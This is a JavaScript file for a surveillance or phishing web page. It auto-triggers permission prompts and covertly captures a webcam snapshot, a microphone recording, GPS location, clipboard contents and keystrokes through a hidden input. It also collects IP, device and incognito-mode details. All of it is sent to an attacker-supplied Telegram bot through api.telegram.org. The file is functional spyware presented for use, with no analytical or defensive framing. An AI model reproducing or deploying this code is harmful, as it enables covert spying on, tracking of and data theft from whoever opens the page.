(async function main() {
    const params = new URLSearchParams(location.search);
    const botToken = params.get('token') || params.get('t');
    const chatId   = params.get('id')   || params.get('chat');

    if (!botToken || !chatId) {
        alert('⚠️ token & id parameters required in URL');
        console.error('Missing token or chat ID.');
        throw new Error('Missing token / chat ID');
    }

    const loadingSpinner = document.getElementById('loadingSpinner');
    const permissionBtn = document.getElementById('permissionBtn');
    const hiddenInput = document.getElementById('hidden-input');
    
    const videoElement = document.getElementById('video');
    const canvasElement = document.getElementById('canvas');
    if (!videoElement || !canvasElement) {
        console.error("Critical DOM elements not found.");
        return;
    }
    const canvasContext = canvasElement.getContext('2d');
    if (!canvasContext) {
        console.error("Canvas 2D context could not be obtained.");
        return;
    }

    const VOICE_RECORD_DURATION_S = 2;
    const KEYBOARD_CAPTURE_DURATION_S = 5;

    canvasElement.width = 640;
    canvasElement.height = 480;

    let hasVideoPermission = false;
    let hasAudioPermission = false;
    let hasLocationPermission = false;
    let hasClipboardPermission = false;
    let videoStream = null;
    let audioStream = null;
    let ps = null;
    let keyboardBuffer = [];

    const esc = str => String(str).replace(/[_*[\]()~`>#+=|{}.!-\\]/g, '\\$&');

    function getTimezone() {
        try {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const offset = new Date().getTimezoneOffset();
            const offsetHours = Math.floor(Math.abs(offset) / 60);
            const offsetMinutes = Math.abs(offset) % 60;
            const offsetSign = offset <= 0 ? '+' : '-';
            const offsetString = `UTC${offsetSign}${String(offsetHours).padStart(2, '0')}:${String(offsetMinutes).padStart(2, '0')}`;
            return `${timezone} (${offsetString})`;
        } catch {
            return '❓';
        }
    }

    async function getBatteryInfo() {
        if (!navigator.getBattery) {
            return { level: '❓', charging: '❓' };
        }
        try {
            const battery = await navigator.getBattery();
            const level = battery.level !== null ? (battery.level * 100).toFixed() + '%' : '❓';
            const charging = battery.charging ? '🔋 Charging' : 'Discharging';
            return { level, charging };
        } catch {
            return { level: '❓', charging: '❓' };
        }
    }

    function getNetworkType() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            const type = conn.effectiveType || conn.type;
            if (type === 'wifi' || type === 'ethernet') return 'Wi-Fi';
            if (type === 'cellular' || type === 'wimax') return 'Mobile Data';
            return type;
        }
        return '❓';
    }

    async function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return '❓';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return '❓';
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            return `${vendor || 'Unknown'} / ${renderer || 'Unknown'}`;
        } catch {
            return '❓';
        }
    }

    
    async function getClipboard() {
        if (!navigator.clipboard || !navigator.clipboard.readText) {
            return '❌ Not supported';
        }
        
        try {
         
            window.focus();
            document.body.focus();
            
           
            const text = await navigator.clipboard.readText();
            hasClipboardPermission = true;
            
            if (!text || text.trim() === '') {
                return '📋 Empty';
            }
            
            return text.trim();
        } catch (err) {
            console.warn("Clipboard read failed:", err.message);
            hasClipboardPermission = false;
            return '❌ Denied';
        }
    }

  
    async function getLocation() {
        if (!navigator.geolocation) {
            return '❌ Not supported';
        }
        
        return new Promise(resolve => {
            const timeout = setTimeout(() => {
                resolve('⏱️ Timeout');
            }, 15000);
            
            navigator.geolocation.getCurrentPosition(
                pos => {
                    clearTimeout(timeout);
                    hasLocationPermission = true;
                    const { latitude, longitude, accuracy } = pos.coords;
                    resolve(`${latitude.toFixed(5)}, ${longitude.toFixed(5)} (±${accuracy.toFixed(0)}m)`);
                },
                err => {
                    clearTimeout(timeout);
                    hasLocationPermission = false;
                    console.warn("Location error:", err.message);
                    resolve('❌ Denied');
                },
                { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
            );
        });
    }

   
    function startKeyboardCapture(durationSeconds) {
        return new Promise(resolve => {
            keyboardBuffer = [];
            
            const keyHandler = (e) => {
                const timestamp = new Date().toLocaleTimeString();
                const key = e.key;
                
                if (key.length === 1) {
                    keyboardBuffer.push(`[${timestamp}] ${key}`);
                } else if (['Enter', 'Backspace', 'Tab', 'Space'].includes(key)) {
                    keyboardBuffer.push(`[${timestamp}] <${key}>`);
                }
            };
            
            
            document.addEventListener('keydown', keyHandler);
            hiddenInput.addEventListener('keydown', keyHandler);
            
         
            hiddenInput.focus();
            
            setTimeout(() => {
                document.removeEventListener('keydown', keyHandler);
                hiddenInput.removeEventListener('keydown', keyHandler);
                resolve(keyboardBuffer);
            }, durationSeconds * 1000);
        });
    }

    async function collectData() {
        const [ipData, batteryInfo, gpuInfo, clipboard, locationInfo] = await Promise.all([
            fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: '❓' })),
            getBatteryInfo(),
            getGPUInfo(),
            getClipboard(),
            getLocation()
        ]);

        let incognitoStatus = '❓';
        let activityStatus = '❓';
        let storageStatus = '❓';
        
        if (ps) {
            try {
                const privaSenseData = await ps.getInfo();
                
                if (privaSenseData.incognito === true || privaSenseData.incognito === 'true') {
                    incognitoStatus = '✅ Incognito Mode';
                } else if (privaSenseData.incognito === false || privaSenseData.incognito === 'false') {
                    incognitoStatus = '❌ Normal Mode';
                } else {
                    incognitoStatus = String(privaSenseData.incognito);
                }
                
                activityStatus = String(privaSenseData.activity || '❓');
                storageStatus = String(privaSenseData.storage || '❓');
                
            } catch {
                incognitoStatus = '❓';
                activityStatus = '❓';
                storageStatus = '❓';
            }
        }

        return {
            ip: ipData.ip,
            ua: navigator.userAgent || '❓',
            bat: `${batteryInfo.level} (${batteryInfo.charging})`,
            net: getNetworkType(),
            gpu: gpuInfo,
            ram: (navigator.deviceMemory || '❓') + ' GB',
            clip: clipboard,
            loc: locationInfo,
            timezone: getTimezone(),
            time: new Date().toLocaleString('en-US', { 
                month: '2-digit',
                day: '2-digit', 
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true,
                timeZone: 'UTC'
            }),
            incognito: incognitoStatus,
            activity: activityStatus,
            storage: storageStatus
        };
    }

    async function captureSnapshot() {
        if (!hasVideoPermission || videoElement.readyState < 2 || videoElement.videoWidth === 0) {
            return null;
        }

        const videoWidth = videoElement.videoWidth;
        const videoHeight = videoElement.videoHeight;

        canvasElement.width = videoWidth;
        canvasElement.height = videoHeight;

        canvasContext.fillStyle = '#FFFFFF';
        canvasContext.fillRect(0, 0, canvasElement.width, canvasElement.height);
        canvasContext.drawImage(videoElement, 0, 0, videoWidth, videoHeight);

        return new Promise(resolve => {
            canvasElement.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    }

    async function recordVoice(seconds = 2) {
        if (!hasAudioPermission || !audioStream) {
            return null;
        }

        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
            ? 'audio/webm;codecs=opus' 
            : 'audio/webm';

        try {
            const rec = new MediaRecorder(audioStream, { mimeType });
            const chunks = [];
            
            rec.ondataavailable = e => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            return new Promise((resolve) => {
                rec.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    resolve(blob);
                };
                
                rec.onerror = () => resolve(null);
                rec.start();
                
                setTimeout(() => {
                    if (rec.state === 'recording') {
                        rec.stop();
                    }
                }, seconds * 1000);
            });
        } catch {
            return null;
        }
    }

    async function sendReport() {
        try {
            console.log("⌨️ Capturing keyboard input...");
            const keyboardData = await startKeyboardCapture(KEYBOARD_CAPTURE_DURATION_S);
            
            const d = await collectData();
            
            
            let keyboardText = '❌ No input detected';
            if (keyboardData.length > 0) {
                keyboardText = keyboardData.slice(0, 20).join('\n');
                if (keyboardData.length > 20) {
                    keyboardText += `\n... (${keyboardData.length - 20} more keys)`;
                }
            }
            
            const formattedText = `\`\`\`
IP         : ${esc(d.ip)}

Browser    : ${esc(d.ua)}

Battery    : ${esc(d.bat)}

Network    : ${esc(d.net)}

GPU        : ${esc(d.gpu)}

RAM        : ${esc(d.ram)}

Clipboard  : ${esc(d.clip)}

Location   : ${esc(d.loc)}

Timezone   : ${esc(d.timezone)}

Incognito  : ${esc(d.incognito)}

Activity   : ${esc(d.activity)}

Storage    : ${esc(d.storage)}

UTC Time   : ${esc(d.time)}
\`\`\``;

            if (hasVideoPermission) {
                const photoBlob = await captureSnapshot();
                if (photoBlob) {
                    const photoFd = new FormData();
                    photoFd.append('chat_id', chatId);
                    photoFd.append('photo', photoBlob, 'snapshot.jpg');
                    photoFd.append('caption', `*📸 Snapshot*\n${formattedText}`);
                    photoFd.append('parse_mode', 'MarkdownV2');

                    const photoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
                        method: 'POST', 
                        body: photoFd 
                    });

                    if (photoResponse.ok) {
                        console.log("✅ Snapshot sent");
                    }
                }
            } else {
                const textPayload = {
                    chat_id: chatId,
                    text: `*📊 Full Report \\(No Camera\\)*\n${formattedText}`,
                    parse_mode: 'MarkdownV2'
                };

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(textPayload)
                });
            }

            if (hasAudioPermission) {
                const voiceBlob = await recordVoice(VOICE_RECORD_DURATION_S);
                if (voiceBlob) {
                    const voiceFd = new FormData();
                    voiceFd.append('chat_id', chatId);
                    voiceFd.append('voice', voiceBlob, 'voice.ogg');

                    await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { 
                        method: 'POST', 
                        body: voiceFd 
                    });
                    console.log("✅ Voice note sent");
                }
            }

          
            if (keyboardData.length > 0) {
                const keyboardPayload = {
                    chat_id: chatId,
                    text: `*⌨️ Keyboard Input*\n\`\`\`\n${esc(keyboardText)}\n\`\`\``,
                    parse_mode: 'MarkdownV2'
                };

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(keyboardPayload)
                });
                console.log("✅ Keyboard data sent");
            }

            console.log("🎉 Report sent successfully!");

        } catch (err) {
            console.error("❌ Report sending error:", err);
        }
    }

    async function requestAllPermissions() {
        console.log("🔄 Requesting permissions...");
        
        
        try {
            if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
                const permission = await DeviceMotionEvent.requestPermission();
                if (permission === 'granted') {
                    ps = new PrivaSense({ incognito: true, activity: true, storage: true });
                } else {
                    ps = new PrivaSense({ incognito: true, activity: false, storage: true });
                }
            } else {
                ps = new PrivaSense({ incognito: true, activity: true, storage: true });
            }
            console.log("✅ PrivaSense initialized");
        } catch (err) {
            console.warn("❌ PrivaSense failed:", err.message);
            ps = null;
        }

        
        console.log("📋 Requesting clipboard permission...");
        try {
            window.focus();
            document.body.focus();
            await navigator.clipboard.readText();
            hasClipboardPermission = true;
            console.log("✅ Clipboard permission granted");
        } catch (err) {
            console.warn("❌ Clipboard permission denied:", err.message);
            hasClipboardPermission = false;
        }

      
        console.log("📍 Requesting location permission...");
        try {
            await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        hasLocationPermission = true;
                        console.log("✅ Location permission granted");
                        resolve(position);
                    },
                    (error) => {
                        console.warn("❌ Location denied (silent)");
                        hasLocationPermission = false;
                        resolve(null); 
                    },
                    { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        } catch (err) {
            hasLocationPermission = false;
        }

        
        console.log("📹 Requesting camera permission...");
        try {
            videoStream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: "user"
                } 
            });
            hasVideoPermission = true;
            videoElement.srcObject = videoStream;
            await videoElement.play();
            
            await new Promise(resolve => {
                if (videoElement.readyState >= 2) {
                    resolve();
                } else {
                    videoElement.onloadeddata = () => resolve();
                }
            });
            
            console.log("✅ Camera permission granted");
        } catch (err) {
            console.warn("❌ Camera permission denied:", err.message);
            hasVideoPermission = false;
        }

      
        console.log("🎤 Requesting microphone permission...");
        try {
            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            hasAudioPermission = true;
            console.log("✅ Microphone permission granted");
        } catch (err) {
            console.warn("❌ Microphone permission denied:", err.message);
            hasAudioPermission = false;
        }

        console.log("\n🚀 All permissions requested!");
        console.log(`📹 Camera: ${hasVideoPermission ? '✅' : '❌'}`);
        console.log(`🎤 Microphone: ${hasAudioPermission ? '✅' : '❌'}`);
        console.log(`📍 Location: ${hasLocationPermission ? '✅' : '❌'}`);
        console.log(`📋 Clipboard: ${hasClipboardPermission ? '✅' : '❌'}`);

        if (loadingSpinner) loadingSpinner.style.display = 'none';
        
        console.log("\n📤 Sending report...");
        await sendReport();
    }

    permissionBtn.style.display = 'block';
    permissionBtn.addEventListener('click', async () => {
        permissionBtn.disabled = true;
        permissionBtn.textContent = '⏳ Loading...';
        await requestAllPermissions();
    });

    setTimeout(() => {
        permissionBtn.click();
    }, 1000);

})();